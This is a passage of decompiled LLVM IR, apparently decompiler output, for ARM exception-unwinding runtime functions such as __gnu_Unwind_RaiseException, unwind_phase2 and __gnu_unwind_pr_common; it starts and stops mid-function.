  uselistorder label %dec_label_pc_188b0, { 1, 0 }
  uselistorder label %dec_label_pc_1889c, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_18974 = add i32 %ucbp, 12
  %v3_18974 = inttoptr i32 %v2_18974 to i32*
  store i32 %stop_fn, i32* %v3_18974, align 4
  %v3_18978 = add i32 %ucbp, 24
  %v4_18978 = inttoptr i32 %v3_18978 to i32*
  store i32 %tmp, i32* %v4_18978, align 4
  %v1_1897c = add i32 %entry_vrs, 60
  %v2_1897c = inttoptr i32 %v1_1897c to i32*
  %v3_1897c = load i32, i32* %v2_1897c, align 4
  %v2_18984 = add i32 %entry_vrs, 64
  %v3_18984 = inttoptr i32 %v2_18984 to i32*
  store i32 %v3_1897c, i32* %v3_18984, align 4
  %v3_1898c = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_1898c

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_189a46 = add i32 %vrs, 64
  %v2_189a47 = inttoptr i32 %v1_189a46 to i32*
  %v3_189a48 = load i32, i32* %v2_189a47, align 4
  %v2_189a89 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_189a48)
  store i32 %v2_189a89, i32* %r0.global-to-local, align 4
  %v2_189ac11 = icmp eq i32 %v2_189a89, 0
  br i1 %v2_189ac11, label %dec_label_pc_189b4, label %dec_label_pc_189e4

dec_label_pc_189b4:                               ; preds = %entry, %dec_label_pc_189b4.dec_label_pc_189a0_crit_edge
  %v0_189b4 = load i32, i32* @r5, align 4
  %v1_189b4 = add i32 %v0_189b4, 64
  %v2_189b4 = inttoptr i32 %v1_189b4 to i32*
  %v3_189b4 = load i32, i32* %v2_189b4, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_189bc = load i32, i32* @r4, align 4
  %v2_189bc = add i32 %v1_189bc, 20
  %v3_189bc = inttoptr i32 %v2_189bc to i32*
  store i32 %v3_189b4, i32* %v3_189bc, align 4
  %v0_189c0 = load i32, i32* @r4, align 4
  %v1_189c8 = add i32 %v0_189c0, 16
  %v2_189c8 = inttoptr i32 %v1_189c8 to i32*
  %v3_189c8 = load i32, i32* %v2_189c8, align 4
  call void @__pseudo_branch(i32 %v3_189c8)
  %v0_189d4 = load i32, i32* %r0.global-to-local, align 4
  %v7_189d4 = icmp eq i32 %v0_189d4, 8
  br i1 %v7_189d4, label %dec_label_pc_189b4.dec_label_pc_189a0_crit_edge, label %dec_label_pc_189dc

dec_label_pc_189b4.dec_label_pc_189a0_crit_edge:  ; preds = %dec_label_pc_189b4
  %v0_189a0.pre = load i32, i32* @r4, align 4
  %v0_189a4.pre = load i32, i32* @r5, align 4
  store i32 %v0_189a0.pre, i32* %r0.global-to-local, align 4
  %v1_189a4 = add i32 %v0_189a4.pre, 64
  %v2_189a4 = inttoptr i32 %v1_189a4 to i32*
  %v3_189a4 = load i32, i32* %v2_189a4, align 4
  %v2_189a8 = call i32 @get_eit_entry(i32 %v0_189a0.pre, i32 %v3_189a4)
  store i32 %v2_189a8, i32* %r0.global-to-local, align 4
  %v2_189ac = icmp eq i32 %v2_189a8, 0
  br i1 %v2_189ac, label %dec_label_pc_189b4, label %dec_label_pc_189e4

dec_label_pc_189dc:                               ; preds = %dec_label_pc_189b4
  %v7_189dc = icmp eq i32 %v0_189d4, 7
  br i1 %v7_189dc, label %dec_label_pc_189e8, label %dec_label_pc_189e4

dec_label_pc_189e4:                               ; preds = %entry, %dec_label_pc_189b4.dec_label_pc_189a0_crit_edge, %dec_label_pc_189dc
  %v0_189e4 = call i32 @abort()
  store i32 %v0_189e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_189e8

dec_label_pc_189e8:                               ; preds = %dec_label_pc_189dc, %dec_label_pc_189e4
  %v0_189e8 = load i32, i32* @r5, align 4
  %v1_189e8 = add i32 %v0_189e8, 4
  store i32 %v1_189e8, i32* %r0.global-to-local, align 4
  %v1_189ec = inttoptr i32 %v1_189e8 to i32*
  %v2_189ec = call i32 @__restore_core_regs(i32* %v1_189ec)
  store i32 %v2_189ec, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 7, 9, 8, 5, 6, 0, 2, 1 }
  uselistorder label %dec_label_pc_189e8, { 1, 0 }
  uselistorder label %dec_label_pc_189e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_189b4, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_189f0 = add i32 %ucbp, 20
  %v2_189f0 = inttoptr i32 %v1_189f0 to i32*
  %v3_189f0 = load i32, i32* %v2_189f0, align 4
  %v1_189f8 = load i32, i32* %r1.global-to-local, align 4
  %v2_189f8 = add i32 %v1_189f8, 64
  %v3_189f8 = inttoptr i32 %v2_189f8 to i32*
  store i32 %v3_189f0, i32* %v3_189f8, align 4
  %v1_189fc = add i32 %ucbp, 12
  %v2_189fc = inttoptr i32 %v1_189fc to i32*
  %v3_189fc = load i32, i32* %v2_189fc, align 4
  %v2_18a00 = icmp eq i32 %v3_189fc, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_18a0c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_18a0c, i32* @r5, align 4
  br i1 %v2_18a00, label %dec_label_pc_18a14, label %dec_label_pc_18a50

dec_label_pc_18a14:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_18a20 = add i32 %ucbp, 16
  %v2_18a20 = inttoptr i32 %v1_18a20 to i32*
  %v3_18a20 = load i32, i32* %v2_18a20, align 4
  call void @__pseudo_branch(i32 %v3_18a20)
  br i1 false, label %dec_label_pc_18a48, label %dec_label_pc_18a34

dec_label_pc_18a34:                               ; preds = %dec_label_pc_18a14
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_13808.559 to i32))
  %v0_18a3c = load i32, i32* @r4, align 4
  %v0_18a40 = load i32, i32* @r5, align 4
  store i32 %v0_18a40, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_18a3c, i32 %v0_18a40)
  br label %dec_label_pc_18a48

dec_label_pc_18a48:                               ; preds = %dec_label_pc_18a14, %dec_label_pc_18a34
  %v0_18a48 = load i32, i32* @r5, align 4
  %v1_18a48 = add i32 %v0_18a48, 4
  %v1_18a4c = inttoptr i32 %v1_18a48 to i32*
  %v2_18a4c = call i32 @__restore_core_regs(i32* %v1_18a4c)
  %v1_18a54.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_18a50

dec_label_pc_18a50:                               ; preds = %entry, %dec_label_pc_18a48
  %v1_18a54 = phi i32 [ %v0_18a0c, %entry ], [ %v1_18a54.pre, %dec_label_pc_18a48 ]
  %v3_18a54 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_18a54, i32 1)
  %v0_18a58 = call i32 @abort()
  ret i32 %v0_18a58

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @abort, { 6, 5, 4, 3, 2, 1, 9, 8, 10, 7, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 45, 46, 47, 48, 49, 51, 20, 17, 18, 19, 13, 14, 15, 21, 22, 16, 4, 5, 6, 7, 8, 9, 10, 11, 12, 32, 56, 60, 59, 58, 52, 53, 40, 41, 42, 43, 44, 54, 55, 57, 35, 36, 50, 33, 37, 34, 26, 27, 23, 24, 25, 0, 28, 29, 30, 31, 38, 39, 1, 2, 3 }
  uselistorder i1 true, { 0, 1, 2, 3, 96, 139, 4, 140, 141, 142, 143, 5, 82, 115, 144, 6, 81, 145, 7, 80, 146, 147, 148, 149, 8, 150, 116, 9, 84, 151, 10, 83, 152, 153, 11, 154, 155, 156, 12, 157, 158, 13, 159, 14, 118, 160, 161, 117, 162, 163, 15, 85, 16, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 18, 87, 19, 174, 175, 176, 20, 86, 177, 21, 17, 178, 179, 22, 180, 181, 182, 23, 183, 184, 185, 186, 187, 24, 25, 119, 26, 27, 28, 138, 88, 188, 189, 89, 190, 121, 191, 192, 30, 193, 194, 31, 90, 196, 29, 197, 195, 198, 120, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 92, 43, 44, 45, 46, 47, 98, 200, 218, 79, 93, 100, 204, 103, 102, 101, 48, 51, 199, 91, 99, 201, 202, 203, 124, 205, 206, 207, 208, 209, 52, 53, 210, 211, 212, 213, 125, 214, 215, 49, 50, 216, 217, 123, 122, 54, 55, 56, 219, 57, 58, 104, 105, 111, 106, 112, 107, 110, 220, 108, 114, 221, 59, 222, 60, 223, 126, 127, 224, 128, 129, 225, 130, 131, 61, 62, 226, 132, 133, 63, 64, 227, 134, 135, 65, 66, 228, 136, 137, 67, 68, 97, 229, 230, 113, 231, 69, 109, 70, 71, 94, 72, 73, 95, 74, 75, 76, 77, 78 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_18a50, { 1, 0 }
  uselistorder label %dec_label_pc_18a48, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_18a5c = load i32, i32* @r4, align 4
  store i32 %v3_18a5c, i32* %stack_var_-16, align 4
  %v6_18a5c = load i32, i32* @r5, align 4
  %v9_18a5c = load i32, i32* @r6, align 4
  %v12_18a5c = load i32, i32* @lr, align 4
  %v1_18a60 = add i32 %entry_vrs, 60
  %v2_18a60 = inttoptr i32 %v1_18a60 to i32*
  %v3_18a60 = load i32, i32* %v2_18a60, align 4
  %v2_18a64 = add i32 %entry_vrs, 64
  %v3_18a64 = inttoptr i32 %v2_18a64 to i32*
  store i32 %v3_18a60, i32* %v3_18a64, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_18a94 = load i32, i32* %v3_18a64, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_18aac = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_18a94)
  %v2_18ab0 = icmp eq i32 %v2_18aac, 0
  br i1 %v2_18ab0, label %dec_label_pc_18ab8, label %dec_label_pc_18aec

dec_label_pc_18ab8:                               ; preds = %entry
  %v0_18ab8 = load i32, i32* @r5, align 4
  %v1_18ac0 = add i32 %v0_18ab8, 16
  %v2_18ac0 = inttoptr i32 %v1_18ac0 to i32*
  %v3_18ac0 = load i32, i32* %v2_18ac0, align 4
  call void @__pseudo_branch(i32 %v3_18ac0)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_18ad8 = load i32, i32* %saved_vrs_-320, align 4
  %v1_18adc = urem i32 %v2_18ad8, 2
  %v2_18adc = icmp eq i32 %v1_18adc, 0
  br i1 %v2_18adc, label %dec_label_pc_18afc, label %dec_label_pc_18ae4

dec_label_pc_18ae4:                               ; preds = %dec_label_pc_18ab8, %dec_label_pc_18afc
  %v0_18ae4 = phi i1 [ false, %dec_label_pc_18ab8 ], [ %phitmp, %dec_label_pc_18afc ]
  br i1 %v0_18ae4, label %dec_label_pc_18b08, label %dec_label_pc_18aec

dec_label_pc_18aec:                               ; preds = %entry, %dec_label_pc_18ae4
  %v2_18af4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18af4, i32* @r4, align 4
  store i32 %v6_18a5c, i32* @r5, align 4
  store i32 %v9_18a5c, i32* @r6, align 4
  store i32 %v12_18a5c, i32* @lr, align 4
  ret i32 9

dec_label_pc_18afc:                               ; preds = %dec_label_pc_18ab8
  %v2_18afc = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_18afc, i32* @r0, align 4
  %v1_18b00 = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_18afc)
  %v0_18ae4.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_18ae4.pre, 6
  br label %dec_label_pc_18ae4

dec_label_pc_18b08:                               ; preds = %dec_label_pc_18ae4
  %v0_18b08 = load i32, i32* @r5, align 4
  %v0_18b0c = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_18b08, i32 %v0_18b0c)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18aec, { 1, 0 }
  uselistorder label %dec_label_pc_18ae4, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_18b14 = add i32 %ucbp, 12
  %v2_18b14 = inttoptr i32 %v1_18b14 to i32*
  %v3_18b14 = load i32, i32* %v2_18b14, align 4
  %v2_18b18 = icmp eq i32 %v3_18b14, 0
  br i1 %v2_18b18, label %dec_label_pc_18b20, label %dec_label_pc_18b24

dec_label_pc_18b20:                               ; preds = %entry
  %v2_18b20 = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_18b24

dec_label_pc_18b24:                               ; preds = %entry, %dec_label_pc_18b20
  %v1_18b24 = add i32 %entry_vrs, 60
  %v2_18b24 = inttoptr i32 %v1_18b24 to i32*
  %v3_18b24 = load i32, i32* %v2_18b24, align 4
  %v2_18b2c = add i32 %entry_vrs, 64
  %v3_18b2c = inttoptr i32 %v2_18b2c to i32*
  store i32 %v3_18b24, i32* %v3_18b2c, align 4
  %v3_18b30 = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_18b30

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 1, 0, 2 }
  uselistorder i32 %entry_vrs, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_18b24, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_18b90

bb:                                               ; preds = %entry
  %v7_18b48 = mul i32 %regclass, 4
  %v8_18b48 = add i32 %v7_18b48, ptrtoint (i32* @global_var_18b50.710 to i32)
  call void @__pseudo_branch(i32 %v8_18b48)
  br label %dec_label_pc_18b90

dec_label_pc_18b90:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_18c78 = load i32, i32* @r4, align 4
  %v6_18c78 = load i32, i32* @r5, align 4
  %v2_18c88 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_18c90 = add i32 %ucbp, 76
  %v2_18c90 = inttoptr i32 %v1_18c90 to i32*
  %v3_18c90 = load i32, i32* %v2_18c90, align 4
  %v1_18c9c = inttoptr i32 %v3_18c90 to i32*
  %v2_18c9c = load i32, i32* %v1_18c9c, align 4
  store i32 %v2_18c9c, i32* @lr, align 4
  %v4_18c9c = add i32 %v3_18c90, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_18ca8 = urem i32 %state, 4
  store i32 %v1_18ca8, i32* %r2.global-to-local, align 4
  %v1_18cac = and i32 %state, 8
  store i32 %v1_18cac, i32* %r0.global-to-local, align 4
  %v4_18cbc = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_18c9c, i32* %v4_18cbc, align 8
  br i1 %v2_18c88, label %dec_label_pc_18ccc, label %dec_label_pc_18fa8

dec_label_pc_18ccc:                               ; preds = %entry
  %v3_18ccc = mul i32 %v2_18c9c, 256
  store i32 %v3_18ccc, i32* %v4_18cbc, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18ce4

dec_label_pc_18ce4:                               ; preds = %dec_label_pc_18fa8, %dec_label_pc_18ccc
  %v0_18d08647090 = phi i32 [ %v2_18fc0, %dec_label_pc_18fa8 ], [ %v4_18c9c, %dec_label_pc_18ccc ]
  store i32 %v1_18ca8, i32* %r2.global-to-local, align 4
  %v1_18ce8 = add i32 %ucbp, 80
  %v2_18ce8 = inttoptr i32 %v1_18ce8 to i32*
  %v3_18ce8 = load i32, i32* %v2_18ce8, align 4
  %v7_18cec = icmp eq i32 %v1_18ca8, 2
  br i1 %v7_18cec, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_18ce4
  %v2_18cf0 = add i32 %ucbp, 56
  %v3_18cf0 = inttoptr i32 %v2_18cf0 to i32*
  %v4_18cf0 = load i32, i32* %v3_18cf0, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_18ce4, %bb
  %v0_18d086470 = phi i32 [ %v0_18d08647090, %dec_label_pc_18ce4 ], [ %v4_18cf0, %bb ]
  %v1_18cf4 = urem i32 %v3_18ce8, 2
  %v2_18cf4 = icmp eq i32 %v1_18cf4, 0
  br i1 %v2_18cf4, label %dec_label_pc_18d08.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_18dc8

dec_label_pc_18d08.preheader:                     ; preds = %bb148
  %v1_18d086571 = inttoptr i32 %v0_18d086470 to i32*
  %v2_18d086672 = load i32, i32* %v1_18d086571, align 4
  %v2_18d0c6874 = icmp eq i32 %v2_18d086672, 0
  br i1 %v2_18d0c6874, label %dec_label_pc_18dc8, label %dec_label_pc_18d14.preheader.lr.ph.lr.ph

dec_label_pc_18d14.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_18d08.preheader
  %v7_18d18 = icmp eq i32 %id, 2
  %v2_18da4 = icmp eq i32 %v1_18ca8, 0
  %v2_18f70 = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_18e8c = icmp eq i32 %v1_18cac, 0
  br label %dec_label_pc_18d14.preheader.lr.ph

dec_label_pc_18d14.preheader.lr.ph:               ; preds = %dec_label_pc_18d14.preheader.lr.ph.lr.ph, %dec_label_pc_18fdc
  %v1_18d2496 = phi i32 [ %v2_18d086672, %dec_label_pc_18d14.preheader.lr.ph.lr.ph ], [ %v2_18d0866, %dec_label_pc_18fdc ]
  %v1_18d2093 = phi i32 [ %v0_18d086470, %dec_label_pc_18d14.preheader.lr.ph.lr.ph ], [ %v2_18fe0, %dec_label_pc_18fdc ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_18d14.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_18fdc ]
  br label %dec_label_pc_18d14.preheader

dec_label_pc_18d14.preheader:                     ; preds = %dec_label_pc_18d14.preheader.lr.ph, %dec_label_pc_18fa0
  %v1_18d2495 = phi i32 [ %v1_18d2496, %dec_label_pc_18d14.preheader.lr.ph ], [ %v2_18d08, %dec_label_pc_18fa0 ]
  %v1_18d2092 = phi i32 [ %v1_18d2093, %dec_label_pc_18d14.preheader.lr.ph ], [ %v1_18fa0, %dec_label_pc_18fa0 ]
  br label %dec_label_pc_18d14

dec_label_pc_18d14:                               ; preds = %dec_label_pc_18d14.preheader, %dec_label_pc_18db8
  %v1_18d24 = phi i32 [ %v1_18d2495, %dec_label_pc_18d14.preheader ], [ %v2_18dbc, %dec_label_pc_18db8 ]
  %v1_18d38 = phi i32 [ %v1_18d2092, %dec_label_pc_18d14.preheader ], [ %v1_18db8, %dec_label_pc_18db8 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_18d18, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_18d14
  %v2_18d1c = add i32 %v1_18d38, 4
  %v3_18d1c = inttoptr i32 %v2_18d1c to i32*
  %v4_18d1c = load i32, i32* %v3_18d1c, align 4
  store i32 %v4_18d1c, i32* @r5, align 4
  store i32 %v1_18d24, i32* @r6, align 4
  %v0_18d28109 = load i32, i32* @r8, align 4
  %v1_18d28110 = add i32 %v0_18d28109, 72
  %v2_18d28111 = inttoptr i32 %v1_18d28110 to i32*
  %v3_18d28112 = load i32, i32* %v2_18d28111, align 4
  store i32 %v3_18d28112, i32* @lr, align 4
  %v2_18d34 = add i32 %v1_18d38, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_18d14
  %v2_18d20 = add i32 %v1_18d38, 2
  %v3_18d20 = inttoptr i32 %v2_18d20 to i16*
  %v4_18d20 = load i16, i16* %v3_18d20, align 2
  %v5_18d20 = zext i16 %v4_18d20 to i32
  store i32 %v5_18d20, i32* @r5, align 4
  %v0_18d28 = load i32, i32* @r8, align 4
  %v1_18d28 = add i32 %v0_18d28, 72
  %v2_18d28 = inttoptr i32 %v1_18d28 to i32*
  %v3_18d28 = load i32, i32* %v2_18d28, align 4
  store i32 %v3_18d28, i32* @lr, align 4
  %v2_18d30 = inttoptr i32 %v1_18d38 to i16*
  %v3_18d30 = load i16, i16* %v2_18d30, align 2
  %v4_18d30 = zext i16 %v3_18d30 to i32
  store i32 %v4_18d30, i32* @r6, align 4
  %v2_18d38 = add i32 %v1_18d38, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_18d38, %.thread16 ], [ %v2_18d34, %bb151 ]
  %v3_18d28115 = phi i32 [ %v3_18d28, %.thread16 ], [ %v3_18d28112, %bb151 ]
  %v0_18d40113 = phi i32 [ %v5_18d20, %.thread16 ], [ %v4_18d1c, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_18d40 = and i32 %v0_18d40113, -2
  %v2_18d44 = add i32 %v1_18d40, %v3_18d28115
  store i32 %v2_18d44, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18d54 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18d54, i32* %r0.global-to-local, align 4
  %v5_18d60 = call i32 @_Unwind_VRS_Get(i32 %v0_18d54, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18d60, i32* %r0.global-to-local, align 4
  %v3_18d64 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_18d64, i32* %r2.global-to-local, align 4
  %v0_18d68 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_18d68, %v3_18d64
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_18d74

._crit_edge:                                      ; preds = %bb152
  %v0_18d8c.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_18d74:                               ; preds = %bb152
  %v0_18d74 = load i32, i32* @r6, align 4
  %v1_18d74 = and i32 %v0_18d74, -2
  %v2_18d78 = add i32 %v1_18d74, %v0_18d68
  %v3_18d7c = icmp ult i32 %v3_18d64, %v2_18d78
  br i1 %v3_18d7c, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_18d74
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_18d74
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_18d8c = phi i32 [ %v0_18d8c.pre, %._crit_edge ], [ %v0_18d74, %bb153 ], [ %v0_18d74, %.thread20 ]
  %v0_18f34 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_18d88 = load i32, i32* @r5, align 4
  %v1_18d8c = urem i32 %v0_18d8c, 2
  %v1_18d88 = mul i32 %v0_18d88, 2
  %v3_18d90 = and i32 %v1_18d88, 2
  %v4_18d90 = or i32 %v3_18d90, %v1_18d8c
  store i32 %v4_18d90, i32* %r2.global-to-local, align 4
  %v7_18d94 = icmp eq i32 %v4_18d90, 1
  br i1 %v7_18d94, label %dec_label_pc_18f28, label %dec_label_pc_18d9c

dec_label_pc_18d9c:                               ; preds = %bb154
  %v2_18d94 = icmp eq i32 %v4_18d90, 0
  br i1 %v2_18d94, label %dec_label_pc_18da0, label %dec_label_pc_18e50

dec_label_pc_18da0:                               ; preds = %dec_label_pc_18d9c
  store i32 %v1_18ca8, i32* %r2.global-to-local, align 4
  br i1 %v2_18da4, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_18da0
  %v0_18db8119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_18db8

bb155:                                            ; preds = %dec_label_pc_18da0
  %v2_18db0 = icmp eq i32 %v0_18f34, 0
  %v0_18db8 = load i32, i32* @r7, align 4
  br i1 %v2_18db0, label %dec_label_pc_18db8, label %dec_label_pc_19130

dec_label_pc_18db8:                               ; preds = %.thread, %bb155
  %v0_18db8120 = phi i32 [ %v0_18db8119, %.thread ], [ %v0_18db8, %bb155 ]
  %v1_18db8 = add i32 %v0_18db8120, 4
  %v1_18dbc = inttoptr i32 %v1_18db8 to i32*
  %v2_18dbc = load i32, i32* %v1_18dbc, align 4
  %v2_18dc0 = icmp eq i32 %v2_18dbc, 0
  br i1 %v2_18dc0, label %dec_label_pc_18dc8, label %dec_label_pc_18d14

dec_label_pc_18dc8:                               ; preds = %dec_label_pc_18fdc, %dec_label_pc_18fa0, %dec_label_pc_18db8, %dec_label_pc_18d08.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_18d08.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18db8 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18fa0 ], [ %stack_var_-76.4, %dec_label_pc_18fdc ]
  %v0_18dc8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18dc8, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_18dd0 = call i32 @__gnu_unwind_execute(i32 %v0_18dc8, %anon_struct_13* %tmp156)
  store i32 %v4_18dd0, i32* %r0.global-to-local, align 4
  store i32 %v4_18dd0, i32* %r5.global-to-local, align 4
  %v2_18dd4 = icmp eq i32 %v4_18dd0, 0
  br i1 %v2_18dd4, label %dec_label_pc_18ddc, label %dec_label_pc_18e58

dec_label_pc_18ddc:                               ; preds = %dec_label_pc_18dc8
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_18de0 = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_18de0, label %bb157, label %dec_label_pc_18dec

bb157:                                            ; preds = %dec_label_pc_18ddc
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18e5c

dec_label_pc_18dec:                               ; preds = %dec_label_pc_18ddc
  %v2_18dec = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_18dec, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18dfc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18dfc, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_18e04 = call i32 @_Unwind_VRS_Get(i32 %v0_18dfc, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_18e08 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_18dfc, i32* %r0.global-to-local, align 4
  %v5_18e1c = call i32 @_Unwind_VRS_Set(i32 %v0_18dfc, i32 %v0_18e08, i32 14, i32 %v0_18e08, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18e1c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r2.global-to-local, align 4
  %v4_18e28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 32) to i32*), align 4
  %v0_18e2c = load i32, i32* %r5.global-to-local, align 4
  %v0_18e30 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18e30, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_18e28, i32* %stack_var_-48, align 4
  %v5_18e44 = call i32 @_Unwind_VRS_Set(i32 %v0_18e30, i32 %v0_18e2c, i32 15, i32 %v0_18e2c, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18e5c

dec_label_pc_18e50:                               ; preds = %dec_label_pc_18d9c
  %v7_18e50 = icmp eq i32 %v4_18d90, 2
  br i1 %v7_18e50, label %dec_label_pc_18e68, label %dec_label_pc_18e58

dec_label_pc_18e58:                               ; preds = %dec_label_pc_18e50, %dec_label_pc_18f3c, %dec_label_pc_18dc8, %dec_label_pc_19130
